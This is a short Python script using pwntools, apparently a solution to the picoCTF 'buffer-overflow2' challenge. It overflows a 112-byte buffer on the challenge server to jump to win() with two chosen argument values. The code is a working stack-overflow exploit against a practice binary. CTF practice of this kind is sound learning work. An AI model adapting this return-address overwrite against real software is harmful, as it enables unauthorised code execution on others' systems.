from pwn import *

# load the on‑disk binary
elf = ELF("./buffer-overflow2")

# start process (or remote)
# p = process("./vuln")
p = remote("saturn.picoctf.net", "60288")

# grab the leak of main’s runtime address
p.recvline()
# compute the real address of win()
win_addr = elf.symbols['win']
print(f"win() address: {hex(win_addr)}")


payload  = b"A" * 112    
# payload += p64(win_addr)
# # payload += b"B" * 4     
# payload += p32(0xCAFEF00D)
# payload += p32(0xF00DF00D)

payload += p32(win_addr)
payload += b"B" * 4     
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)

print(f"payload: {payload}")
print(win_addr)
# send the payload
p.sendline(payload)
# receive the output
print(p.recvline())
print(p.recvline())

p.close()
